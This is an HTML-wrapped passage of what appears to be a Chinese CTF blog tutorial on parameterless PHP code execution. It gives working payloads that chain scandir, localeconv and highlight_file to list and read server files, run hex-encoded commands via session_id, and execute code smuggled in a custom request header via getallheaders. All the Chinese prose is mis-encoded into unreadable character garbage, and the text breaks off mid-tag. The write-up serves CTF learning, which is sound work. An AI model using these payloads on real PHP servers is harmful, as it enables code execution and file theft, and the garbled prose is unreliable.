    <content type="html"><![CDATA[<h3 id="æ— å‚æ•°RCEé¢˜ç›®ç‰¹å¾"><a href="#æ— å‚æ•°RCEé¢˜ç›®ç‰¹å¾" class="headerlink" title="æ— å‚æ•°RCEé¢˜ç›®ç‰¹å¾"></a>æ— å‚æ•°RCEé¢˜ç›®ç‰¹å¾</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ <code>[^\W]+\((?R)?\)</code> åŒ¹é…äº†ä¸€ä¸ªæˆ–å¤šä¸ªéæ ‡ç‚¹ç¬¦å·å­—ç¬¦ï¼ˆç®€å•æ¥è¯´åŒ¹é…å‡½æ•°åï¼‰åè·Ÿçš„ä¸€ä¸ªæ‹¬å·ï¼ˆè¡¨ç¤ºå‡½æ•°è°ƒç”¨ï¼‰ã€‚å…¶ä¸­ <code>(?R)</code> æ˜¯é€’å½’å¼•ç”¨ï¼Œå®ƒåªèƒ½åŒ¹é…å’Œæ›¿æ¢åµŒå¥—çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸èƒ½å¤„ç†å‡½æ•°å‚æ•°ã€‚æ‰€ä»¥è¯´ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åï¼Œæ¯ä¸ªå‡½æ•°éƒ½ä¼šè¢«åˆ é™¤ï¼Œæœ€ç»ˆåªå‰©ä¸€ä¸ª;ï¼Œè€Œé¢˜ç›®ä¸­æœ€ç»ˆçš„è¦æ±‚ä¹Ÿæ˜¯å¼ºç­‰äºä¸€ä¸ª;ï¼Œæ‰èƒ½è¿›è¡Œä¸‹é¢çš„eval()ï¼Œç®€è€Œè¨€ä¹‹æ¥è¯´å°±æ˜¯è¦ä½¿ç”¨ä¸å¸¦å‚æ•°çš„å‡½æ•°</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129195640525.png" class title="image-20250129195640525"><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129195647510.png" class title="image-20250129195647510"><p>æ‰€ä»¥å°±éœ€è¦æ‰¾åˆ°èƒ½å¤ŸæŸ¥çœ‹ç›®å½•æ–‡ä»¶çš„å‡½æ•°å¹¶ä¸”ä¸å¸¦å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">scandir</span>()å¯ä»¥ä½¿ç”¨é‡Œé¢ä¸å«å‚æ•°<br><span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;1&#x27;</span>)ä¸å¯ä»¥ä½¿ç”¨ï¼Œé‡Œé¢å«æœ‰å‚æ•°<span class="hljs-number">1</span>ï¼Œæ— æ³•è¢«æ›¿æ¢åˆ é™¤<br></code></pre></td></tr></table></figure><p>ä»‹ç»ä»¥ä¸‹ç›¸å…³payloadéœ€è¦çš„å‡½æ•°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">scandir() :å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•åç§°ï¼ˆglob()å¯æ›¿æ¢ï¼‰<br>localeconv() ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ï¼ˆä½†æ˜¯è¿™é‡Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯â€˜.â€™ï¼Œè¿™ä¸ª.çš„ç”¨å¤„å¾ˆå¤§ï¼‰<br>current() ï¼šè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚pos()å’Œcurrent()æ˜¯åŒä¸€ä¸ªä¸œè¥¿<br>getcwd() :å–å¾—å½“å‰å·¥ä½œç›®å½•<br><span class="hljs-built_in">dirname</span>():å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†<br>array_flip() :äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„<br>array_rand() :ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ<br>array_reverse():å°†æ•°ç»„å†…å®¹åè½¬<br>strrev():ç”¨äºåè½¬ç»™å®šå­—ç¬¦ä¸²<br>getcwd()ï¼šè·å–å½“å‰å·¥ä½œç›®å½•è·¯å¾„<br><span class="hljs-built_in">dirname</span>() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br><span class="hljs-built_in">chdir</span>() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚<br><span class="hljs-built_in">eval</span>()ã€assert()ï¼šå‘½ä»¤æ‰§è¡Œ<br>hightlight_file()ã€show_source()ã€readfile()ï¼šè¯»å–æ–‡ä»¶å†…å®¹<br></code></pre></td></tr></table></figure><p>ä¸¾ä¸€ä¸ªä¾‹å­å…³äºscandir()å‡½æ•°çš„ä½¿ç”¨ï¼š</p><p>scandir(â€˜.â€™)æ˜¯è¿”å›å½“å‰ç›®å½•ï¼Œå°±å¯ä»¥é localeconv() è¿”å›çš„æ•°ç»„ç¬¬ä¸€ä¸ªå°±æ˜¯â€˜.â€™ï¼Œcurrent()å–ç¬¬ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆcurrent(localeconv())å°±èƒ½æ„é€ ä¸€ä¸ªâ€˜.â€™,é‚£ä¹ˆä»¥ä¸‹å°±æ˜¯ä¸€ä¸ªç®€å•çš„è¿”å›æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶çš„payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?å‚æ•°=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>æ•°ç»„ç§»åŠ¨æ“ä½œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">end</span>() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">next</span>() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">prev</span>() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">reset</span>() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">each</span>() ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨<br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸€ï¼šscandir-æœ€å¸¸è§„çš„é€šè§£"><a href="#æ–¹æ³•ä¸€ï¼šscandir-æœ€å¸¸è§„çš„é€šè§£" class="headerlink" title="æ–¹æ³•ä¸€ï¼šscandir() æœ€å¸¸è§„çš„é€šè§£"></a>æ–¹æ³•ä¸€ï¼šscandir() æœ€å¸¸è§„çš„é€šè§£</h3><p>ä¸€é“ä¾‹é¢˜BuuCTF [GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">exp=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é€ä¸ªåˆ†æpayloadçš„æ„æˆï¼š</p><p>1ã€var_dump(localeconv());å¯ä»¥çœ‹è§ç¬¬ä¸€ä¸ªstring[1]å°±æ˜¯ä¸€ä¸ªâ€œ.â€ï¼Œè¿™ä¸ªç‚¹æ˜¯ç”±localeconv()äº§ç”Ÿçš„</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200501464.png" class title="image-20250129200501464"><p>2ã€åˆ©ç”¨<code>current()</code>å‡½æ•°å°†è¿™ä¸ªç‚¹å–å‡ºæ¥çš„ï¼Œ<code>â€˜.â€™</code>ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•ï¼Œé‚£æ¥ä¸‹æ¥å°±å¾ˆå¥½ç†è§£äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹å®Œæˆéå†ç›®å½•çš„æ“ä½œï¼Œç›¸å½“äºå°±æ˜¯<code>linux</code>ä¸­çš„<code>ls</code>æŒ‡ä»¤</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200643025.png" class title="image-20250129200643025"><p>3ã€æ—¢ç„¶current()å–ç¬¬ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆcurrent(localeconv())æ„é€ ä¸€ä¸ª<code>&#39;.&#39;</code>,<strong>è€Œ</strong><code>&#39;.&#39;</code> <strong>è¡¨ç¤ºå½“å‰ç›®å½•</strong>ï¼Œ<code>scandir(&#39;.&#39;)</code> å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ï¼Œè¿™é‡Œæˆ‘ä»¬å¾—çŸ¥flagæ‰€åœ¨çš„æ–‡ä»¶åå°±æ˜¯flag.php</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200853439.png" class title="image-20250129200853439"><p>4ã€ç„¶è€Œflagçš„æ–‡ä»¶ååœ¨æ¯”è¾ƒåç«¯æˆ‘ä»¬å¯ä»¥é€šè¿‡array_reverse()å°†æ•°ç»„å†…å®¹åè½¬ï¼Œè®©å®ƒä»å€’æ•°ç¬¬äºŒçš„ä½ç½®å˜æˆæ­£æ•°ç¬¬äºŒ</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200918061.png" class title="image-20250129200918061"><p>5ã€ç§»åŠ¨æŒ‡é’ˆè¯»å–ç¬¬äºŒä¸ªæ•°ç»„ï¼Œå‚ç…§ä¸‹åˆ—æ•°ç»„ç§»åŠ¨æ“ä½œå¯çŸ¥æˆ‘ä»¬åº”é€‰ç”¨next()å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">end</span>() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">next</span>() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">prev</span>() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">reset</span>() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">each</span>() ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨<br></code></pre></td></tr></table></figure><p>6ã€æœ€åç”¨highlight_file()è¿”å›æ–‡ä»¶å†…å®¹</p><p>ä½¿ç”¨æœ€å¤šæœ€çµæ´»çš„ä¸€ä¸ªå‡½æ•°,å¯ä»¥æ„é€ å‡ºä¸åŒç”¨æ³•ï¼Œè¿™é‡Œç›´æ¥å¼•ç”¨äº†åˆ«äººçš„payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))); <span class="hljs-comment">//æŸ¥çœ‹å’Œè¯»å–å½“å‰ç›®å½•æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))); <span class="hljs-comment">//æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));  <span class="hljs-comment">//æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))))))); <span class="hljs-comment">//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<span class="hljs-comment">//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<span class="hljs-comment">//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localtime</span>(<span class="hljs-title function_ invoke__">time</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))))))))));<span class="hljs-comment">//è¿™ä¸ªå¾—çˆ†ç ´ï¼Œä¸ç„¶æ‰‹åŠ¨è¦åˆ·æ–°å¾ˆä¹…ï¼Œå¦‚æœæ–‡ä»¶æ˜¯æ­£æ•°æˆ–å€’æ•°ç¬¬ä¸€ä¸ªç¬¬äºŒä¸ªæœ€å¥½ä¸è¿‡äº†ï¼Œç›´æ¥å®šä½</span><br>  <span class="hljs-comment">//æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</span><br>  <span class="hljs-comment">//æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒï¼šsession-id"><a href="#æ–¹æ³•äºŒï¼šsession-id" class="headerlink" title="æ–¹æ³•äºŒï¼šsession_id()"></a>æ–¹æ³•äºŒï¼šsession_id()</h3><p> ä½¿ç”¨æ¡ä»¶ï¼šå½“è¯·æ±‚å¤´ä¸­æœ‰cookieæ—¶ï¼ˆæˆ–è€…èµ°æŠ•æ— è·¯æ‰‹åŠ¨æ·»åŠ cookieå¤´ä¹Ÿè¡Œï¼Œæœ‰äº›CTFé¢˜ä¸ä¼šå¡ï¼‰</p><p> é¦–å…ˆæˆ‘ä»¬éœ€è¦å¼€å¯session_start()æ¥ä¿è¯session_id()çš„ä½¿ç”¨ï¼Œsession_idå¯ä»¥ç”¨æ¥è·å–å½“å‰ä¼šè¯IDï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¯ä»¥æŠ“å–PHPSESSIDåé¢çš„ä¸œè¥¿ï¼Œä½†æ˜¯phpsessionä¸å…è®¸()å‡ºç°</p><h4 id="æ³•ä¸€ï¼šhex2binï¼ˆï¼‰"><a href="#æ³•ä¸€ï¼šhex2binï¼ˆï¼‰" class="headerlink" title="æ³•ä¸€ï¼šhex2binï¼ˆï¼‰"></a>æ³•ä¸€ï¼šhex2binï¼ˆï¼‰</h4><p>æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨å¯¹å‘½ä»¤è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œåé¢åœ¨ç”¨å‡½æ•°hex2bin()è§£ç è½¬å›å»ï¼Œä½¿å¾—åç«¯å®é™…æ¥æ”¶åˆ°çš„æ˜¯æ¶æ„ä»£ç ã€‚æˆ‘ä»¬æŠŠæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç åï¼Œæ›¿æ¢æ‰â€˜Cookie:PHPSESSID&#x3D;â€™åé¢çš„å€¼</p><p>ä»¥ä¸‹æ˜¯åå…­è¿›åˆ¶ç¼–ç è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°phpinfo();çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œå³706870696e666f28293b</p><p>é‚£ä¹ˆpayloadå°±å¯ä»¥æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?å‚æ•°=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>())));<br></code></pre></td></tr></table></figure><p>åŒæ—¶æ›´æ”¹cookieåçš„å€¼ä¸ºæƒ³æ‰§è¡Œçš„å‘½ä»¤çš„åå…­è¿›åˆ¶ç¼–ç </p><h4 id="æ³•äºŒï¼šè¯»æ–‡ä»¶"><a href="#æ³•äºŒï¼šè¯»æ–‡ä»¶" class="headerlink" title="æ³•äºŒï¼šè¯»æ–‡ä»¶"></a>æ³•äºŒï¼šè¯»æ–‡ä»¶</h4><p>ä¾‹é¢˜ä¾ç„¶æ˜¯[GXYCTF2019]ç¦æ­¢å¥—å¨ƒï¼Œåœ¨çŸ¥é“æ–‡ä»¶åä¸ºflag.phpçš„æƒ…å†µä¸‹ç›´æ¥è¯»æ–‡ä»¶</p><p>å¦‚æœå·²çŸ¥æ–‡ä»¶åï¼ŒæŠŠæ–‡ä»¶åå†™åœ¨PHPSESSIDåé¢ï¼Œæ„é€ payloadä¸ºï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">session_id</span>(<span class="hljs-title">session_start</span>()));</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129201750646.png" class title="image-20250129201750646"><h3 id="æ–¹æ³•ä¸‰ï¼šgetallheaders"><a href="#æ–¹æ³•ä¸‰ï¼šgetallheaders" class="headerlink" title="æ–¹æ³•ä¸‰ï¼šgetallheaders()"></a>æ–¹æ³•ä¸‰ï¼šgetallheaders()</h3><p>getallheaders()è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå±€é™äºApacheï¼ˆapache_request_headers()å’Œgetallheaders()åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯äº’ç›¸æ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ˜¯å±€é™äºApacheï¼‰</p><p>å½“ç¡®å®šèƒ½å¤Ÿè¿”å›æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨æ•°æ®åŒ…æœ€åä¸€è¡ŒåŠ ä¸Šä¸€ä¸ªè¯·æ±‚å¤´ï¼Œå†™å…¥æ¶æ„ä»£ç ï¼Œå†ç”¨end()å‡½æ•°æŒ‡å‘æœ€åä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä½¿å…¶æ‰§è¡Œï¼Œpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()));<br></code></pre></td></tr></table></figure><p>å€Ÿç”¨åˆ«äººçš„å›¾æ¼”ç¤ºï¼š</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202117068.png" class title="image-20250129202117068"><p>skyæ˜¯è‡ªå·±æ·»åŠ çš„è¯·æ±‚å¤´ï¼Œ end()æŒ‡å‘æœ€åä¸€è¡Œçš„skyåçš„ä»£ç ï¼Œè¾¾åˆ°phpinfoçš„ç›®çš„ï¼Œç„¶åå¯ä»¥è¿›ä¸€æ­¥å»rceã€‚</p><h3 id="æ–¹æ³•å››ï¼šget-defined-vars"><a href="#æ–¹æ³•å››ï¼šget-defined-vars" class="headerlink" title="æ–¹æ³•å››ï¼šget_defined_vars()"></a>æ–¹æ³•å››ï¼šget_defined_vars()</h3><p>ç›¸è¾ƒäºgetallheadersï¼ˆï¼‰æ›´åŠ å…·æœ‰æ™®éæ€§ï¼Œå®ƒå¯ä»¥å›æ˜¾å…¨å±€å˜é‡$_GETã€$_POSTã€$_FILESã€$_COOKIEï¼Œ</p><p>è¿”å›æ•°ç»„é¡ºåºä¸º$_GETâ€“&gt;$_POSTâ€“&gt;$_COOKIEâ€“&gt;$_FILES</p><p>é¦–å…ˆç¡®è®¤æ˜¯å¦æœ‰å›æ˜¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 